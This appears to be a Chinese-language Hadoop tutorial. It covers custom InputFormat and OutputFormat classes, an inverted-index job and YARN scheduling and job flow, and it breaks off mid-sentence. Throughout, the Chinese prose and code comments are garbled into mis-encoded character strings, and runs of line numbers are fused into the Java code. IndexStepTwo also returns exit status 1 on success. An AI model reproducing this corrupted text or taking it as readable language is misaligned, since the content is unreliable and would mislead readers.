åœ¨mapreduceç±»çš„main()æ–¹æ³•ä¸­æŒ‡å®šè‡ªå®šä¹‰è¾“å…¥ï¼šjob.setInputFormatClass(XxxInputFormat.class); ä»£ç  123456789101112131415161718192021222324252627282930313233package com.rox.mapreduce.mr4._02_inputformat;import java.io.IOException;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.InputSplit;import org.apache.hadoop.mapreduce.JobContext;import org.apache.hadoop.mapreduce.RecordReader;import org.apache.hadoop.mapreduce.TaskAttemptContext;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;public class WholeFileInputFormat extends FileInputFormat&lt;NullWritable, Text&gt; &#123; /** * è®¾ç½®æ¯ä¸ªå°æ–‡ä»¶ä¸å¯åˆ†ç‰‡,ä¿è¯ä¸€ä¸ªå°æ–‡ä»¶ç”Ÿæˆä¸€ä¸ªkey-vé”®å€¼å¯¹ */ @Override protected boolean isSplitable(JobContext context, Path filename) &#123; return false; &#125; @Override public RecordReader&lt;NullWritable, Text&gt; createRecordReader(InputSplit split, TaskAttemptContext context) throws IOException, InterruptedException &#123; WholeFileRecordReader reader = new WholeFileRecordReader(); reader.initialize(split, context); return reader; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package com.rox.mapreduce.mr4._02_inputformat;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FSDataInputStream;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IOUtils;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.InputSplit;import org.apache.hadoop.mapreduce.RecordReader;import org.apache.hadoop.mapreduce.TaskAttemptContext;import org.apache.hadoop.mapreduce.lib.input.FileSplit;public class WholeFileRecordReader extends RecordReader&lt;NullWritable, Text&gt;&#123; private FileSplit fileSplit; private Configuration conf; private Text value = new Text(); private boolean processed = false; // æ ‡è¯†æ–‡ä»¶æ˜¯å¦è¯»å–å®Œæˆ /** * åˆå§‹åŒ–æ–¹æ³• */ @Override public void initialize(InputSplit split, TaskAttemptContext context) throws IOException, InterruptedException &#123; this.fileSplit=(FileSplit)split; this.conf = context.getConfiguration(); &#125; @Override public boolean nextKeyValue() throws IOException, InterruptedException &#123; if (!processed) &#123; byte[] contents = new byte[(int)fileSplit.getLength()]; Path file = fileSplit.getPath(); FileSystem fs = file.getFileSystem(conf); FSDataInputStream in = null; try &#123; in = fs.open(file); // æŠŠè¾“å…¥æµä¸Šçš„æ•°æ®å…¨éƒ¨è¯»å–åˆ°contentså­—èŠ‚æ•°ç»„ä¸­ IOUtils.readFully(in, contents, 0, contents.length); // æŠŠè¯»å–åˆ°çš„æ•°æ®è®¾ç½®åˆ°valueé‡Œ value.set(contents,0,contents.length); &#125; finally &#123; IOUtils.closeStream(in); &#125; processed = true; return true; &#125; return false; &#125; @Override public NullWritable getCurrentKey() throws IOException, InterruptedException &#123; return NullWritable.get(); &#125; @Override public Text getCurrentValue() throws IOException, InterruptedException &#123; return value; &#125; @Override public float getProgress() throws IOException, InterruptedException &#123; return processed ? 1.0f : 0.0f; &#125; @Override public void close() throws IOException &#123; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package com.rox.mapreduce.mr4._02_inputformat;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.conf.Configured;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.InputSplit;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.input.FileSplit;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;import org.apache.hadoop.util.Tool;import org.apache.hadoop.util.ToolRunner;public class SmallFilesConvertToBigMR extends Configured implements Tool &#123; public static void main(String[] args) throws Exception &#123; int exitCode = ToolRunner.run(new SmallFilesConvertToBigMR(), args); System.exit(exitCode); &#125; @Override public int run(String[] args) throws Exception &#123; Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); Job job = Job.getInstance(conf, "combine small files to bigfile"); job.setJarByClass(SmallFilesConvertToBigMR.class); job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(Text.class); job.setMapperClass(SmallFilesConvertToBigMRMapper.class); job.setReducerClass(SmallFilesConvertToBigMRReducer.class); job.setOutputKeyClass(NullWritable.class); job.setOutputValueClass(Text.class);////////ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ job.setInputFormatClass(WholeFileInputFormat.class); // job.setOutputFormatClass(SequenceFileOutputFormat.class); Path input = new Path("/in/joindemo"); Path output = new Path("/out/bigfile"); FileInputFormat.setInputPaths(job, input); FileSystem fs = FileSystem.get(conf); if (fs.exists(output)) &#123; fs.delete(output, true); &#125; FileOutputFormat.setOutputPath(job, output); int status = job.waitForCompletion(true) ? 0 : 1; return status; &#125; static class SmallFilesConvertToBigMRMapper extends Mapper&lt;NullWritable, Text, Text, Text&gt; &#123; private Text filenameKey; @Override protected void setup( Mapper&lt;NullWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; InputSplit split = context.getInputSplit(); Path path = ((FileSplit) split).getPath(); filenameKey = new Text(path.toString()); &#125; @Override protected void map(NullWritable key, Text value, Mapper&lt;NullWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; context.write(filenameKey, value); &#125; &#125; static class SmallFilesConvertToBigMRReducer extends Reducer&lt;Text, Text, NullWritable, Text&gt; &#123; @Override protected void reduce(Text filename, Iterable&lt;Text&gt; bytes, Context context) throws IOException, InterruptedException &#123; context.write(NullWritable.get(), bytes.iterator().next()); &#125; &#125;&#125; 11ã€è‡ªå®šä¹‰è¾“å‡º OutputFormat é»˜è®¤çš„æ–‡ä»¶åŠ è½½ï¼šTextOutputFormat é»˜è®¤çš„æ–‡ä»¶è¯»å–ï¼šLineRecordWriter æºç è¿½è¸ªè¿‡ç¨‹ ç•¥ æ¡ˆä¾‹ï¼šå°†è€ƒè¯•æˆç»©åˆæ ¼çš„è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¸åŠæ ¼çš„è¾“å‡ºåˆ°å¦ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼ˆæ³¨æ„ï¼Œä¸åŒäºåˆ†åŒºï¼Œåˆ†åŒºåªæ˜¯é‡ç»“æœè¾“å‡ºåˆ°åŒä¸€æ–‡ä»¶å¤¹ä¸‹ä¸åŒæ–‡ä»¶ï¼‰ è‡ªå®šä¹‰è¾“å‡ºï¼Œéœ€è¦åˆ›å»ºä¸¤ä¸ªç±»ï¼Œå¹¶é€šè¿‡Jobå¯¹è±¡æŒ‡å®šè‡ªå®šä¹‰è¾“å…¥ \1. åˆ›å»ºXxxOutputFormatç±»ï¼Œç»§æ‰¿FileOutputFormat&lt;&gt;ï¼Œé‡å†™getRecordWriter()æ–¹æ³• \2. åˆ›å»ºXxxRecordWriterç±»ï¼Œç»§æ‰¿RecordWriter&lt;&gt;ï¼Œé‡å†™ä»¥ä¸‹æ–¹æ³•ï¼š write()ï¼šçœŸæ­£å‘å¤–å†™å‡ºçš„æ–¹æ³•ï¼Œéœ€è¦å°†ç»“æœè¾“å‡ºåˆ°å‡ ä¸ªä¸åŒæ–‡ä»¶å¤¹ï¼Œå°±éœ€è¦åˆ›å»ºå‡ ä¸ªè¾“å‡ºæµ è€Œè¾“å‡ºæµé€šè¿‡FileSystemå¯¹è±¡è·å–ï¼ŒFileSystemå¯¹è±¡è·å–éœ€è¦é…ç½®æ–‡ä»¶ ä¸€èˆ¬å¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•ç›´æ¥ä¼ å…¥FileSystemå¯¹è±¡ close()ï¼šé‡Šæ”¾èµ„æº \3. åœ¨mapreduceç±»çš„main()æ–¹æ³•ä¸­æŒ‡å®šè‡ªå®šä¹‰è¾“å…¥ï¼šjob.setOutputFormatClass(XxxOutputFormat.class); ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package com.rox.mapreduce.outputformat;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class MultipleOutputMR &#123; public static void main(String[] args) throws Exception &#123; // æŒ‡å®šHDFSç›¸å…³å‚æ•° Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); // ï£¿ åˆ›å»º/é…ç½® Job Job job = Job.getInstance(conf); // è®¾ç½®JaråŒ…ç±»å‹:è¿™é‡Œåƒä¸‡åˆ«å†™é”™äº† job.setJarByClass(MultipleOutputMR.class); // è®¾ç½®Map Reduceæ‰§è¡Œç±» job.setMapperClass(MultipleOutputMRMapper.class); // è®¾ç½®Mapè¾“å‡ºç±» job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(NullWritable.class); ////////////// è®¾ç½®reduceæ‰§è¡Œä¸ªæ•°ä¸º0 job.setNumReduceTasks(0); ///////////// è®¾ç½®MapOutputFormatClass job.setOutputFormatClass(MyOutputFormat.class); // è®¾ç½®è¾“å…¥ è¾“å‡ºè·¯å¾„ String inP = "/in/newScoreIn"; String outP = "/out/myoutformat/mulWriteSuc"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); // è®¾ç½®å¦‚æœå­˜åœ¨è·¯å¾„å°±åˆ é™¤ Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.exists(mypath)) &#123; hdfs.delete(mypath, true); &#125; // ï£¿ æ‰§è¡Œjob System.exit(job.waitForCompletion(true)?0:-1); &#125; static class MultipleOutputMRMapper extends Mapper&lt;LongWritable, Text, Text, NullWritable&gt; &#123; @Override protected void map(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, NullWritable&gt;.Context context) throws IOException, InterruptedException &#123; // å‚è€ƒæ¬¡æ•°&gt;7æ¬¡ ç®—åˆæ ¼ String[] splits = value.toString().split(","); if (splits.length &gt; 9) &#123; context.write(new Text("1::"+value.toString()), NullWritable.get()); &#125;else &#123; context.write(new Text("2::"+value.toString()), NullWritable.get()); &#125; &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233package com.rox.mapreduce.outputformat;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FSDataOutputStream;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.RecordWriter;import org.apache.hadoop.mapreduce.TaskAttemptContext;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class MyOutputFormat extends FileOutputFormat&lt;Text, NullWritable&gt; &#123; @Override public RecordWriter&lt;Text, NullWritable&gt; getRecordWriter( TaskAttemptContext job) throws IOException, InterruptedException &#123; Configuration configuration = job.getConfiguration(); FileSystem fs = FileSystem.get(configuration); Path p1 = new Path("/out/myoutformat/out1"); Path p2 = new Path("/out/myoutformat/out2"); FSDataOutputStream out1 = fs.create(p1); FSDataOutputStream out2 = fs.create(p2); return new MyRecordWriter(out1,out2); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.rox.mapreduce.outputformat;import java.io.IOException;import org.apache.hadoop.fs.FSDataOutputStream;import org.apache.hadoop.io.IOUtils;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.RecordWriter;import org.apache.hadoop.mapreduce.TaskAttemptContext;public class MyRecordWriter extends RecordWriter&lt;Text, NullWritable&gt; &#123; FSDataOutputStream fsout = null; FSDataOutputStream fsout1 = null; public MyRecordWriter(FSDataOutputStream fsout, FSDataOutputStream fsout1) &#123; super(); this.fsout = fsout; this.fsout1 = fsout1; &#125; @Override public void write(Text key, NullWritable value) throws IOException, InterruptedException &#123; String[] strs = key.toString().split("::"); if (strs[0].equals("1")) &#123; fsout.write((strs[1]+"\n").getBytes()); &#125;else &#123; fsout1.write((strs[1]+"\n").getBytes()); &#125; &#125; @Override public void close(TaskAttemptContext context) throws IOException, InterruptedException &#123; IOUtils.closeStream(fsout); IOUtils.closeStream(fsout1); &#125;&#125; 12. å€’æ’ç´¢å¼•å»ºç«‹æ¦‚å¿µï¼š å€’æ’ç´¢å¼•ï¼ˆInverted Indexï¼‰ï¼Œä¹Ÿå¸¸è¢«ç§°ä¸ºåå‘ç´¢å¼•ã€ç½®å…¥æ¡£æ¡ˆæˆ–åå‘æ¡£æ¡ˆï¼Œæ˜¯ä¸€ç§ç´¢å¼•æ–¹æ³•ï¼Œè¢«ç”¨æ¥å­˜å‚¨åœ¨å…¨æ–‡æœç´¢ä¸‹æŸä¸ªå•è¯åœ¨ä¸€ä¸ªæ–‡æ¡£æˆ–è€…ä¸€ç»„æ–‡æ¡£ä¸­çš„å­˜å‚¨ä½ç½®çš„æ˜ å°„ã€‚å®ƒæ˜¯æ–‡æ¡£æ£€ç´¢ç³»ç»Ÿä¸­æœ€å¸¸ç”¨çš„æ•°æ®ç»“æ„ã€‚äº†è§£è¯¦æƒ…å¯è‡ªè¡Œç™¾åº¦ éœ€æ±‚ï¼šæœ‰å¤§é‡çš„æ–‡æœ¬ï¼ˆæ–‡æ¡£ã€ç½‘é¡µï¼‰ï¼Œéœ€è¦å»ºç«‹æœç´¢ç´¢å¼• , è¦æ±‚ç»Ÿè®¡æ¯ä¸€ä¸ªå•è¯åœ¨æ¯ä¸ªæ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°, å¦‚ä¸‹ æ€è·¯ å…ˆæ ¹æ®å•è¯&amp;æ–‡ä»¶åä¸º key, è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ æ‹†åˆ†æ–‡ä»¶è¡Œ, ä»¥å•è¯ä¸º key, value å†æ‹¼æ¥ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140// ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ InverIndexStepOne ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿package cn.itcast.bigdata.mr.inverindex;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.input.FileSplit;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class InverIndexStepOne &#123; static class InverIndexStepOneMapper extends Mapper&lt;LongWritable, Text, Text, IntWritable&gt; &#123; Text k = new Text(); IntWritable v = new IntWritable(1); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String line = value.toString(); String[] words = line.split(" "); FileSplit inputSplit = (FileSplit) context.getInputSplit(); String fileName = inputSplit.getPath().getName(); for (String word : words) &#123; k.set(word + "--" + fileName); context.write(k, v); &#125; &#125; &#125; static class InverIndexStepOneReducer extends Reducer&lt;Text, IntWritable, Text, IntWritable&gt; &#123; @Override protected void reduce(Text key, Iterable&lt;IntWritable&gt; values, Context context) throws IOException, InterruptedException &#123; int count = 0; for (IntWritable value : values) &#123; count += value.get(); &#125; context.write(key, new IntWritable(count)); &#125; &#125; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); Job job = Job.getInstance(conf); job.setJarByClass(InverIndexStepOne.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); FileInputFormat.setInputPaths(job, new Path("D:/srcdata/inverindexinput")); FileOutputFormat.setOutputPath(job, new Path("D:/temp/out")); // FileInputFormat.setInputPaths(job, new Path(args[0])); // FileOutputFormat.setOutputPath(job, new Path(args[1])); job.setMapperClass(InverIndexStepOneMapper.class); job.setReducerClass(InverIndexStepOneReducer.class); job.waitForCompletion(true); &#125;&#125;// ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ IndexStepTwo ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿package cn.itcast.bigdata.mr.inverindex;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class IndexStepTwo &#123; public static class IndexStepTwoMapper extends Mapper&lt;LongWritable, Text, Text, Text&gt;&#123; @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String line = value.toString(); String[] files = line.split("--"); context.write(new Text(files[0]), new Text(files[1])); &#125; &#125; public static class IndexStepTwoReducer extends Reducer&lt;Text, Text, Text, Text&gt;&#123; @Override protected void reduce(Text key, Iterable&lt;Text&gt; values, Context context) throws IOException, InterruptedException &#123; StringBuffer sb = new StringBuffer(); for (Text text : values) &#123; sb.append(text.toString().replace("\t", "--&gt;") + "\t"); &#125; context.write(key, new Text(sb.toString())); &#125; &#125; public static void main(String[] args) throws Exception &#123; if (args.length &lt; 1 || args == null) &#123; args = new String[]&#123;"D:/temp/out/part-r-00000", "D:/temp/out2"&#125;; &#125; Configuration config = new Configuration(); Job job = Job.getInstance(config); job.setMapperClass(IndexStepTwoMapper.class); job.setReducerClass(IndexStepTwoReducer.class);// job.setMapOutputKeyClass(Text.class);// job.setMapOutputValueClass(Text.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(Text.class); FileInputFormat.setInputPaths(job, new Path(args[0])); FileOutputFormat.setOutputPath(job, new Path(args[1])); System.exit(job.waitForCompletion(true) ? 1:0); &#125;&#125; 13ã€Yarn1ã€Yarnå›¾ç¤ºç®€ä»‹ åœ¨Hadoop1.xæ—¶ï¼Œ åªæœ‰ä¸¤ä¸ªä¸»è¦ç»„ä»¶ï¼šhdfsï¼ˆæ–‡ä»¶å­˜å‚¨ï¼‰ï¼Œ MapReduceï¼ˆè®¡ç®—ï¼‰ æ‰€æœ‰çš„è®¡ç®—ç›¸å…³çš„å…¨éƒ¨æ”¾åœ¨MapReduceä¸Š JobTracker: æ•´ä¸ªè®¡ç®—ç¨‹åºçš„è€å¤§ èµ„æºè°ƒåº¦ï¼šéšæœºè°ƒåº¦ ç›‘æ§ç¨‹åºè¿è¡Œçš„çŠ¶æ€ï¼Œå¯åŠ¨è¿è¡Œç¨‹åº å­˜åœ¨å•ç‚¹æ•…éšœé—®é¢˜ TaskTrackerï¼šè´Ÿè´£è®¡ç®—ç¨‹åºçš„æ‰§è¡Œ å¼ºè¡Œçš„å°†è®¡ç®—èµ„æºåˆ†æˆ2éƒ¨åˆ† MapSlot ReduceSlot æ¯ä¸€éƒ¨åˆ†èµ„æºåªèƒ½è·‘å¯¹åº”çš„ä»»åŠ¡ ç¼ºé™·ï¼š å•ç‚¹æ•…éšœ èµ„æºè°ƒåº¦éšæœºï¼Œä¼šé€ æˆèµ„æºæµªè´¹ JobTrackerçš„è¿è¡Œå‹åŠ›è¿‡å¤§ Hadoop2.xï¼š åˆ†ç†å‡ºYarnï¼Œä¸“é—¨è´Ÿè´£é›†ç¾¤çš„èµ„æºç®¡ç†å’Œè°ƒåº¦ Yarnçš„è¿›ç¨‹ï¼šResourceManager: æ•´ä¸ªèµ„æºè°ƒåº¦çš„è€å¤§ æ¥å—hadoopå®¢æˆ·ç«¯çš„è¯·æ±‚ æ¥å—NodeManager çš„çŠ¶æ€æŠ¥å‘Šï¼Œ NMçš„èµ„æºçŠ¶æ€å’Œå­˜æ´»çŠ¶æ€ èµ„æºè°ƒåº¦ï¼Œæ•´ä¸ªè®¡ç®—ç¨‹åºçš„èµ„æºè°ƒåº¦ï¼Œè°ƒåº¦çš„è¿è¡Œèµ„æºå’ŒèŠ‚ç‚¹ å†…éƒ¨ç»„ä»¶ï¼š ASMâ€”â€”ApplicationsManager æ‰€æœ‰åº”ç”¨ç¨‹åºçš„ç®¡ç†è€…ï¼Œè´Ÿè´£è°ƒåº¦åº”ç”¨ç¨‹åº Schedulerâ€”â€”è°ƒåº¦å™¨æ¦‚å¿µ è°ƒåº¦çš„æ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œå“ªä¸ªè®¡ç®—ç¨‹åº è°ƒåº¦å™¨ï¼š FIFO: first in first out å…ˆæäº¤çš„å…ˆæ‰§è¡Œï¼Œåæäº¤çš„åæ‰§è¡Œ å†…éƒ¨ç»´æŠ¤ä¸€ä¸ªé˜Ÿåˆ— FAIR: å…¬å¹³è°ƒåº¦å™¨ å¤§å®¶å¹³åˆ†èµ„æºè¿è¡Œ å‡è®¾åˆšå¼€å§‹åªæœ‰ä¸€ä¸ªä»»åŠ¡ï¼Œå èµ„æº100%ï¼Œæ­¤æ—¶åˆæ¥äº†ä¸€ä¸ªä»»åŠ¡ï¼Œè¿™æ˜¯è¿›è¡Œèµ„æºå¹³åˆ†ï¼Œæ¯äºº50% å†…éƒ¨ä¹Ÿæ˜¯ç»´æŠ¤ä¸€ä¸ªé˜Ÿåˆ— CAPACITY: å¯ä»¥æŒ‰éœ€è¿›è¡Œé…ç½®ï¼Œä½¿ç”¨èµ„æº å†…éƒ¨å¯ç»´æŠ¤å¤šä¸ªé˜Ÿåˆ—ï¼Œå¤šä¸ªé˜Ÿåˆ—ä¹‹é—´å¯ä»¥è¿›è¡Œèµ„æºåˆ†é… ä¾‹å¦‚ï¼šåˆ†é…ä¸¤ä¸ªé˜Ÿåˆ— é˜Ÿåˆ—1ï¼š60% é˜Ÿåˆ—2ï¼š40% æ¯ä¸ªé˜Ÿåˆ—ä¸­éƒ½æ˜¯æ‰§è¡ŒFIFOçš„ NodeManagerï¼š è´Ÿè´£çœŸæ­£çš„æä¾›èµ„æºï¼Œè¿è¡Œè®¡ç®—ç¨‹åº æ¥å—ResourceManagerçš„å‘½ä»¤ æä¾›èµ„æºè¿è¡Œè®¡ç®—ç¨‹åº MRAppMaster: å•ä¸ªè®¡ç®—ç¨‹åºçš„è€å¤§, ç±»ä¼¼äºé¡¹ç›®ç»ç† è´Ÿè´£å¸®åŠ©å½“å‰è®¡ç®—ç¨‹åºå‘ResourceManagerç”³è¯·èµ„æº è´Ÿè´£å¯åŠ¨ MapTask å’Œ ReduceTask ä»»åŠ¡ Container: æŠ½è±¡èµ„æºå®¹å™¨ï¼Œå°è£…è¿™ä¸€å®šçš„cpuï¼Œio å’Œç½‘ç»œèµ„æºï¼ˆé€»è¾‘æ¦‚å¿µï¼‰ æ˜¯è¿è¡ŒMapTaskï¼ŒReduceTaskç­‰çš„è¿è¡Œèµ„æºå•ä½ 1ä¸ªsplit â€”â€” 1ä¸ªMapTask (ReduceTask) â€”â€” 1ä¸ªContainer â€”â€” æ˜¾ç¤ºä¸ºYarnChildï¼Œåº•å±‚è¿è¡Œçš„èµ„æºå•ä½å°±æ˜¯Container 2ã€Yarnè¿è¡Œè¿‡ç¨‹ MRAppMasterä¼šåœ¨æ‰€æœ‰çš„MapTaskæ‰§è¡Œåˆ°0.8çš„æ—¶å€™ï¼Œå¼€å¯ReduceTaskä»»åŠ¡ YARN ä½œä¸šæ‰§è¡Œæµç¨‹: ç”¨æˆ·å‘ YARN ä¸­æäº¤åº”ç”¨ç¨‹åºï¼Œå…¶ä¸­åŒ…æ‹¬ MRAppMaster ç¨‹åºï¼Œå¯åŠ¨ MRAppMaster çš„å‘½ä»¤ï¼Œ ç”¨æˆ·ç¨‹åºç­‰ã€‚ ResourceManager ä¸ºè¯¥ç¨‹åºåˆ†é…ç¬¬ä¸€ä¸ª Containerï¼Œå¹¶ä¸å¯¹åº”çš„ NodeManager é€šè®¯ï¼Œè¦æ±‚ å®ƒåœ¨è¿™ä¸ª Container ä¸­å¯åŠ¨åº”ç”¨ç¨‹åº MRAppMasterã€‚ MRAppMaster é¦–å…ˆå‘ ResourceManager æ³¨å†Œï¼Œè¿™æ ·ç”¨æˆ·å¯ä»¥ç›´æ¥é€šè¿‡ ResourceManager æŸ¥çœ‹åº”ç”¨ç¨‹åºçš„è¿è¡ŒçŠ¶æ€ï¼Œç„¶åå°†ä¸ºå„ä¸ªä»»åŠ¡ç”³è¯·èµ„æºï¼Œå¹¶ç›‘æ§å®ƒçš„è¿è¡ŒçŠ¶æ€ï¼Œç›´åˆ°è¿è¡Œç»“ æŸï¼Œé‡å¤ 4 åˆ° 7 çš„æ­¥éª¤ã€‚ MRAppMaster é‡‡ç”¨è½®è¯¢çš„æ–¹å¼é€šè¿‡ RPC åè®®å‘ ResourceManager ç”³è¯·å’Œé¢†å–èµ„æºã€‚ ä¸€æ—¦ MRAppMaster ç”³è¯·åˆ°èµ„æºåï¼Œä¾¿ä¸å¯¹åº”çš„ NodeManager é€šè®¯ï¼Œè¦æ±‚å®ƒå¯åŠ¨ä»»åŠ¡ã€‚ NodeManager ä¸ºä»»åŠ¡è®¾ç½®å¥½è¿è¡Œç¯å¢ƒ(åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€JAR åŒ…ã€äºŒè¿›åˆ¶ç¨‹åºç­‰)åï¼Œå°† ä»»åŠ¡å¯åŠ¨å‘½ä»¤å†™åˆ°ä¸€ä¸ªè„šæœ¬ä¸­ï¼Œå¹¶é€šè¿‡è¿è¡Œè¯¥è„šæœ¬å¯åŠ¨ä»»åŠ¡ã€‚ å„ä¸ªä»»åŠ¡é€šè¿‡æŸä¸ª RPC åè®®å‘ MRAppMaster æ±‡æŠ¥è‡ªå·±çš„çŠ¶æ€å’Œè¿›åº¦ï¼Œä»¥è®© MRAppMaster éšæ—¶æŒæ¡å„ä¸ªä»»åŠ¡çš„è¿è¡ŒçŠ¶æ€ï¼Œä»è€Œå¯ä»¥åœ¨ä»»åŠ¡è´¥çš„æ—¶å€™é‡æ–°å¯åŠ¨ä»»åŠ¡ã€‚ 8ã€åº”ç”¨ç¨‹åºè¿è¡Œå®Œæˆåï¼ŒMRAppMaster å‘ ResourceManager æ³¨é”€å¹¶å…³é—­è‡ªå·±ã€‚ 3ã€Jobçš„æäº¤è¿‡ç¨‹(å¾…æ•´ç†) å®¢æˆ·ç«¯å‘rmå‘é€ æäº¤jobè¯·æ±‚ rmå‘å®¢æˆ·ç«¯å‘é€ å…±äº«èµ„æºè·¯å¾„ å’Œ applicationId å®¢æˆ·ç«¯å°†ç¨‹åºè¿è¡Œéœ€è¦çš„å…±äº«èµ„æºæ”¾è¿›å…±äº«èµ„æºè·¯å¾„åŒ…æ‹¬ï¼šç¨‹åºjaråŒ…ï¼Œxmlé…ç½®æ–‡ä»¶ï¼Œsplitåˆ‡ç‰‡ä¿¡æ¯ å®¢æˆ·ç«¯å‘rmå‘é€èµ„æºæ”¾ç½®æˆåŠŸçš„æŠ¥å‘Šï¼Œå¹¶çœŸæ­£ æäº¤åº”ç”¨ç¨‹åº rmæ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªç©ºé—²çš„èµ„æºèŠ‚ç‚¹(æ¯”å¦‚ï¼šnode01) åˆ°èµ„æºèŠ‚ç‚¹(node01)ä¸Šå¯åŠ¨container å¯åŠ¨MRAppMaster åˆ›å»ºä½œä¸šç°¿ è®°å½• maptask å’Œ reducetask çš„ è¿è¡ŒçŠ¶æ€å’Œè¿›åº¦ ç­‰ä¿¡æ¯ mrappmasterå»å…±äº«èµ„æºè·¯å¾„ä¸‹ ,è·å– åˆ‡ç‰‡ å’Œ é…ç½®æ–‡ä»¶ ç­‰ä¿¡æ¯ mrappmaster å‘ rm ç”³è¯·maptask å’Œ reducetaskçš„èµ„æº rm åœ¨å¤„ç† mrappmaster è¯·æ±‚æ—¶ï¼Œä¼š ä¼˜å…ˆå¤„ç†æœ‰å…³maptaskçš„è¯·æ±‚ rm å‘ mrappmaster è¿”å›ç©ºé—²èŠ‚ç‚¹ï¼ˆæ•°æ®æœ¬åœ°ä¼˜å…ˆåŸåˆ™ï¼‰ï¼Œè¿è¡Œmaptask æˆ– reducetaskä¼˜å…ˆè¿”å›æœ‰æ•°æ®çš„èŠ‚ç‚¹ã€‚ å¯¹è±¡èŠ‚ç‚¹éœ€è¦åˆ°hdfs 